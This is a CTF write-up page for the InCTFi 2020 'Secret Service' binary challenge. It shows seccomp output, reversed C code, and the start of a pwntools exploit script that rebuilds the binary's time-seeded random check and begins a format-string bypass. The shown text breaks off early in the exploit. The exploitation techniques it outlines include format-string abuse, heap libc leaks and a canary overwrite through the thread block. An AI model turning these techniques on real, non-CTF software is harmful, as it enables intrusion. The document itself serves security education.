@@ -1,0 +1,412 @@
+<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
+         InCTFi 2020 Secret Service Writeup
+        
+    </title><meta content="InCTFi 2020 Secret Service Writeup" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/inctf-secret-service/&t=InCTFi 2020 Secret Service Writeup"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>InCTFi 2020 Secret Service Writeup<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-08-14</time></div></div><section class=body><h2 id=tl-dr>tl;dr</h2><ul><li>Use format String to get into secret service.<li>Get libc leaks by overwriting mapped bit of a free chunk.<li>Overwrite the Thread Local Block , thus overwriting canary to get buffer overflow.</ul><p><strong>Challenge Points :</strong> 996<p><strong>No of Solves :</strong> 4<h2 id=challenge-description>Challenge Description</h2><p><code>There is a secret service hidden in the depths of the binary. Get into it,  use/hack it to your own needs and don't forget to leave a feedback :P.</code><p><a href="https://drive.google.com/file/d/1E4mXspk2zpwOmBj1dVHKu5ibvP9sRx6V/view?usp=sharing">Here</a> are the Challenge files.<h2 id=analysis-of-the-challenge-binary>Analysis Of The Challenge Binary</h2><p>The binary is standard <em>x86 64-bit Dynamic stripped</em> executable. Additionally , <strong>glibc 2.31</strong> , the loader and <strong>libseccomp</strong> has been provided so that there are no heap mismatches later.<p>Here's the output of checksec -<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>CANARY</span><span>    : ENABLED
+</span><span style=color:#ffb454>FORTIFY</span><span>   : disabled
+</span><span style=color:#ffb454>NX</span><span>        : ENABLED
+</span><span style=color:#ffb454>PIE</span><span>       : ENABLED
+</span><span style=color:#ffb454>RELRO</span><span>     : FULL
+</span><span>
+</span></code></pre><p>Here's the seccomp dump.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span>
+</span><span> line  CODE  JT   JF      K
+</span><span style=color:#f29668>=================================
+</span><span> </span><span style=color:#f29718>0000</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x20 0x00 0x00 0x00000004  </span><span>A </span><span style=color:#f29668>= </span><span>arch
+</span><span> </span><span style=color:#f29718>0001</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x1f 0xc000003e  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span>ARCH_X86_64) goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>0002</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x20 0x00 0x00 0x00000000  </span><span>A </span><span style=color:#f29668>= </span><span>sys_number
+</span><span> </span><span style=color:#f29718>0003</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x35 0x00 0x01 0x40000000  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>< </span><span style=color:#f29718>0x40000000</span><span>) goto </span><span style=color:#f29718>0005
+</span><span> </span><span style=color:#f29718>0004</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x1c 0xffffffff  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span style=color:#f29718>0xffffffff</span><span>) goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>0005</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x1a 0x00 0x00000003  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>close) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0006</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x19 0x00 0x00000005  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>fstat) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0007</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x18 0x00 0x00000009  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>mmap) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>000</span><span>8</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x17 0x00 0x0000000a  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>mprotect) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>000</span><span>9</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x16 0x00 0x0000000b  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>munmap) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0010</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x15 0x00 0x00000014  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>writev) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0011</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x14 0x00 0x00000020  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>dup) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0012</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x13 0x00 0x00000021  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>dup2) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0013</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x12 0x00 0x00000023  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>nanosleep) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0014</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x11 0x00 0x00000025  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>alarm) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0015</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x10 0x00 0x00000038  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>clone) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0016</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x0f 0x00 0x0000003c  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>exit) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0017</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x0e 0x00 0x00000048  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>fcntl) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>001</span><span>8</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x0d 0x00 0x000000e6  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>clock_nanosleep) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>001</span><span>9</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x0c 0x00 0x000000e7  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>exit_group) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0020</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x0b 0x00 0x00000101  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>openat) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0021</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x0a 0x00 0x00000111  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span>set_robust_list) goto </span><span style=color:#f29718>0032
+</span><span> </span><span style=color:#f29718>0022</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x04 0x00000000  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span>read) goto </span><span style=color:#f29718>0027
+</span><span> </span><span style=color:#f29718>0023</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x20 0x00 0x00 0x00000014  </span><span>A </span><span style=color:#f29668>= </span><span>fd </span><span style=color:#f29668>>> </span><span style=color:#f29718>32 </span><span style=font-style:italic;color:#5c6773># read(fd, buf, count)
+</span><span> </span><span style=color:#f29718>0024</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x08 0x00000000  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span style=color:#f29718>0x0</span><span>) goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>0025</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x20 0x00 0x00 0x00000010  </span><span>A </span><span style=color:#f29668>= </span><span>fd </span><span style=font-style:italic;color:#5c6773># read(fd, buf, count)
+</span><span> </span><span style=color:#f29718>0026</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x05 0x06 0x00000000  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>== </span><span style=color:#f29718>0x0</span><span>) goto </span><span style=color:#f29718>0032 </span><span style=color:#ff7733>else </span><span>goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>0027</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x05 0x00000001  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span>write) goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>002</span><span>8</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x20 0x00 0x00 0x00000014  </span><span>A </span><span style=color:#f29668>= </span><span>fd </span><span style=color:#f29668>>> </span><span style=color:#f29718>32 </span><span style=font-style:italic;color:#5c6773># write(fd, buf, count)
+</span><span> </span><span style=color:#f29718>002</span><span>9</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x03 0x00000000  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span style=color:#f29718>0x0</span><span>) goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>0030</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x20 0x00 0x00 0x00000010  </span><span>A </span><span style=color:#f29668>= </span><span>fd </span><span style=font-style:italic;color:#5c6773># write(fd, buf, count)
+</span><span> </span><span style=color:#f29718>0031</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x15 0x00 0x01 0x00000001  </span><span style=color:#ff7733>if </span><span>(A </span><span style=color:#f29668>!= </span><span style=color:#f29718>0x1</span><span>) goto </span><span style=color:#f29718>0033
+</span><span> </span><span style=color:#f29718>0032</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x06 0x00 0x00 0x7fff0000  </span><span style=color:#ff7733>return </span><span>ALLOW
+</span><span> </span><span style=color:#f29718>0033</span><span style=color:#bfbab0cc>: </span><span style=color:#f29718>0x06 0x00 0x00 0x00000000  </span><span style=color:#ff7733>return </span><span>KILL
+</span><span>
+</span></code></pre><p>A few syscalls among openat , read and write have been left open intending for an <strong>orw</strong> shellcode in the end. But , there are seccomp contraints which let you read only from fd <strong>0</strong> and write only to fd <strong>1</strong>. There are simple ways to pass them which we'll see towards the end of this post.<h2 id=reversing-and-exploit-development>Reversing And Exploit Development</h2><p>The binary initially asks for a <code>name</code> and an unsigned int <code>Age</code>. Before all this , it initially <code>mmaps</code> a writeable region and then calls a function which generates a random 2 byte constraint.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=color:#ff7733>void </span><span style=color:#ffb454>get_rand</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span style=color:#f29718>region</span><span>)
+</span><span>{
+</span><span>    </span><span style=font-style:italic;color:#39bae6>time_t</span><span> toc</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> tic </span><span style=color:#f29668>= </span><span style=color:#f07178>time</span><span>(</span><span style=color:#f29668>&</span><span>toc)</span><span style=color:#bfbab0cc>,</span><span>end_t</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>do</span><span>{
+</span><span>    </span><span style=color:#f07178>srand</span><span>(tic</span><span style=color:#f29668>/</span><span style=color:#f29718>60</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> lower </span><span style=color:#f29668>= </span><span style=color:#f29718>0x1000 </span><span style=color:#bfbab0cc>,</span><span> upper </span><span style=color:#f29668>= </span><span style=color:#f29718>0xffff</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> rand_num </span><span style=color:#f29668>= </span><span>(</span><span style=color:#f07178>rand</span><span>()</span><span style=color:#f29668>%</span><span>(upper</span><span style=color:#f29668>-</span><span>lower</span><span style=color:#f29668>+</span><span style=color:#f29718>1</span><span>)) </span><span style=color:#f29668>+</span><span> lower</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> delay </span><span style=color:#f29668>= </span><span style=color:#f07178>rand</span><span>()</span><span style=color:#f29668>%</span><span style=color:#f29718>300 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1</span><span style=color:#bfbab0cc>;
+</span><span>    end_t </span><span style=color:#f29668>=</span><span> tic </span><span style=color:#f29668>+</span><span> delay</span><span style=color:#bfbab0cc>;
+</span><span>    tic </span><span style=color:#f29668>=</span><span> tic </span><span style=color:#f29668>+</span><span> delay</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f07178>srand</span><span>(end_t</span><span style=color:#f29668>/</span><span style=color:#f29718>30</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ff7733>unsigned int</span><span> rand_num_2 </span><span style=color:#f29668>= </span><span>(</span><span style=color:#f07178>rand</span><span>()</span><span style=color:#f29668>%</span><span>(upper</span><span style=color:#f29668>-</span><span>lower</span><span style=color:#f29668>+</span><span style=color:#f29718>1</span><span>)) </span><span style=color:#f29668>+</span><span> lower</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f07178>memset</span><span>(region</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>0</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>4</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f07178>memcpy</span><span>(region</span><span style=color:#bfbab0cc>,</span><span style=color:#f29668>&</span><span>rand_num_2</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>2</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)region </span><span style=color:#f29668>&= </span><span>(</span><span style=color:#ff7733>unsigned long</span><span>)rand_num</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>while</span><span>(</span><span style=color:#f29668>*</span><span>(</span><span style=color:#ff7733>long </span><span style=color:#f29668>*</span><span>)region</span><span style=color:#f29668><</span><span style=color:#f29718>0x1000</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>    </span><span style=color:#ffb454>MProtect</span><span>(region)</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>We create a random 2 byte vulnerable contraint.<p>Finally the mmaped region is mprotected to be <code>read-only</code>.<p>Later on , the age is verified with the 2 byte contraint which has to be satisfied by the format string vulnerability.<h3 id=an-unintended-flaw>An Unintended Flaw</h3><p>The only thing I forgot to do was add a check to age (< 0x900) , so that only format string can be used to bypass the check to enter the secret service.<p>But since I didn't add a check, the format string is rendered <strong>useless</strong> as participants can directly calculate the age from the library using <strong>ctypes</strong> or plain python and give that as age :(. {: .notice}<p>But now I'd like to discuss how you could do it the intended way using format string.<p>Well , I've included the fixed binary in the handout folder and now u can try the challenges without any unintended flaws :).<h3 id=the-intended-way-to-get-into-the-secret-service>The Intended Way To Get Into The Secret Service</h3><p>Here's the exploit snippet which mimics the 2 byte contraint.<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>import </span><span>ctypes
+</span><span style=color:#ff7733>from </span><span>ctypes </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
+</span><span style=color:#ff7733>from </span><span>time </span><span style=color:#ff7733>import </span><span>sleep
+</span><span style=color:#ff7733>import </span><span>sys
+</span><span>
+</span><span>context</span><span style=color:#f29668>.</span><span>arch</span><span style=color:#f29668>=</span><span style=color:#c2d94c>"amd64"
+</span><span>HOST </span><span style=color:#f29668>= </span><span style=color:#c2d94c>'35.245.143.0'
+</span><span>PORT </span><span style=color:#f29668>= </span><span style=color:#f29718>7777
+</span><span>LIBC </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>checksec </span><span style=color:#f29668>= </span><span style=color:#f29718>False</span><span>)
+</span><span>libc </span><span style=color:#f29668>= </span><span>ctypes</span><span style=color:#f29668>.</span><span>cdll</span><span style=color:#f29668>.</span><span style=color:#ffb454>LoadLibrary</span><span>(</span><span style=color:#c2d94c>"./libc.so.6"</span><span>)
+</span><span>context</span><span style=color:#f29668>.</span><span>noptrace</span><span style=color:#f29668>=</span><span style=color:#f29718>True
+</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(HOST</span><span style=color:#bfbab0cc>,</span><span>PORT)
+</span><span style=color:#ff7733>else</span><span>:
+</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>'./chall'</span><span>)
+</span><span>
+</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
+</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
+</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
+</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
+</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
+</span><span>s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
+</span><span>
+</span><span>
+</span><span style=font-style:italic;color:#5c6773>#Defining functions for various heap operations
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>add</span><span>(</span><span style=color:#f29718>idx</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>size</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>data</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>">> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'1'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"Index : "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"size : "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(size))
+</span><span>    </span><span style=color:#ffb454>sa</span><span>(</span><span style=color:#c2d94c>"details -> </span><span style=color:#95e6cb>\n</span><span style=color:#c2d94c>"</span><span style=color:#bfbab0cc>,</span><span>data)
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>view</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>">> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"Candidate: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>hack</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>">> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'2020'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"Candidate: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>free</span><span>(</span><span style=color:#f29718>idx</span><span>):
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>">> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'3'</span><span>)
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>"Candidate: "</span><span style=color:#bfbab0cc>,</span><span style=font-style:italic;color:#39bae6>str</span><span>(idx))
+</span><span>
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>move_on</span><span>():
+</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>">> "</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'4'</span><span>)
+</span><span>
+</span><span style=font-style:italic;color:#5c6773>#Mimicing the random function implemented by binary to break it
+</span><span style=color:#ff7733>def </span><span style=color:#ffb454>get_rand</span><span>():
+</span><span>    toc </span><span style=color:#f29668>= </span><span style=color:#ffb454>c_long</span><span>()
+</span><span>    tic </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>time</span><span>(</span><span style=color:#ffb454>byref</span><span>(toc))
+</span><span>    </span><span style=color:#ff7733>while </span><span style=color:#f29718>True</span><span>:
+</span><span>        libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>srand</span><span>(tic</span><span style=color:#f29668>/</span><span style=color:#f29718>60</span><span>)
+</span><span>        lower </span><span style=color:#f29668>= </span><span style=color:#f29718>0x1000
+</span><span>        upper </span><span style=color:#f29668>= </span><span style=color:#f29718>0xffff
+</span><span>        rand_num </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>rand</span><span>()</span><span style=color:#f29668>%</span><span>(upper</span><span style=color:#f29668>-</span><span>lower</span><span style=color:#f29668>+</span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>+ </span><span>lower
+</span><span>        delay </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>rand</span><span>()</span><span style=color:#f29668>%</span><span style=color:#f29718>300 </span><span style=color:#f29668>+ </span><span style=color:#f29718>1
+</span><span>        end_time </span><span style=color:#f29668>= </span><span>tic </span><span style=color:#f29668>+ </span><span>delay
+</span><span>        tic </span><span style=color:#f29668>= </span><span>tic </span><span style=color:#f29668>+ </span><span>delay
+</span><span>        libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>srand</span><span>(end_time</span><span style=color:#f29668>/</span><span style=color:#f29718>30</span><span>)
+</span><span>        rand_num_2 </span><span style=color:#f29668>= </span><span>libc</span><span style=color:#f29668>.</span><span style=color:#ffb454>rand</span><span>()</span><span style=color:#f29668>%</span><span>(upper</span><span style=color:#f29668>-</span><span>lower</span><span style=color:#f29668>+</span><span style=color:#f29718>1</span><span>) </span><span style=color:#f29668>+ </span><span>lower
+</span><span>        region </span><span style=color:#f29668>= </span><span>rand_num </span><span style=color:#f29668>& </span><span>rand_num_2
+</span><span>        </span><span style=color:#ff7733>if</span><span>(region</span><span style=color:#f29668>></span><span style=color:#f29718>0x1000</span><span>):
+</span><span>            </span><span style=color:#ff7733>return </span><span>region
+</span><span>
+</span></code></pre><p>Now that we have calculated the age , we need to somehow overwrite the age pointer with this so that we pass the check.<h3 id=triggering-the-format-string-bug>Triggering The Format String Bug</h3><p>You can think of directly overwriting the age pointer with the afore calculated random number , but the issue is , I had added checks for directly not allowing numbers greater than <code>0x900</code> to be present in the input string.<pre class=language-c data-lang=c style=background:#0f1419;color:#bfbab0><code class=language-c data-lang=c><span style=font-style:italic;color:#5c6773>//%n is allowed in format string , but u cant write large numbers (greater than 0x900) with %n
+</span><span style=color:#ff7733>void </span><span style=color:#ffb454>check_num</span><span>(</span><span style=color:#ff7733>char </span><span style=color:#f29668>*</span><span style=color:#f29718>p</span><span>)
+</span><span>{
+</span><span>    </span><span style=color:#ff7733>while </span><span>(</span><span style=color:#f29668>*</span><span>p) 
+</span><span>    { 
+</span><span>        </span><span style=color:#ff7733>if </span><span>( </span><span style=color:#f07178>isdigit</span><span>(</span><span style=color:#f29668>*</span><span>p)) 
+</span><span>        {
+</span><span>            </span><span style=color:#ff7733>long</span><span> val </span><span style=color:#f29668>= </span><span style=color:#f07178>strtol</span><span>(p</span><span style=color:#bfbab0cc>, </span><span style=color:#f29668>&</span><span>p</span><span style=color:#bfbab0cc>, </span><span style=color:#f29718>10</span><span>)</span><span style=color:#bfbab0cc>; 
+</span><span>            </span><span style=color:#ff7733>if</span><span>(val</span><span style=color:#f29668>></span><span style=color:#f29718>0x900</span><span>)
+</span><span>            {
+</span><span>                </span><span style=color:#f07178>puts</span><span>(</span><span style=color:#c2d94c>"Not allowed"</span><span>)</span><span style=color:#bfbab0cc>;
+</span><span>                </span><span style=color:#ffb454>Exit</span><span>()</span><span style=color:#bfbab0cc>;
+</span><span>            }
+</span><span>        } 
+</span><span>        </span><span style=color:#ff7733>else
+</span><span>            p</span><span style=color:#f29668>++</span><span style=color:#bfbab0cc>;
+</span><span>    }
+</span><span>    </span><span style=color:#ff7733>return</span><span style=color:#bfbab0cc>;
+</span><span>}
+</span><span>
+</span></code></pre><p>So it only leaves us with the solution of writing the random number on stack and then copying it from there to the age pointer.<p>We can copy numbers from stack using <code>%*offset$d</code>. Let's use it in our exploit. {: .notice}<pre class=language-python data-lang=python style=background:#0f1419;color:#bfbab0><code class=language-python data-lang=python><span>
+</span><span style=color:#ff7733>if </span><span>__name__</span><span style=color:#f29668>==</span><span style=color:#c2d94c>"__main__"</span><span>:
+</span><span>
+</span><span>    region </span><span style=color:#f29668>= </span><span style=color:#ffb454>get_rand</span><span>()
+</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"region = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(region))
+</span><span>    </span><span style=font-style:italic;color:#5c6773>#Using format string to pass the initial check , to enter the secret_service
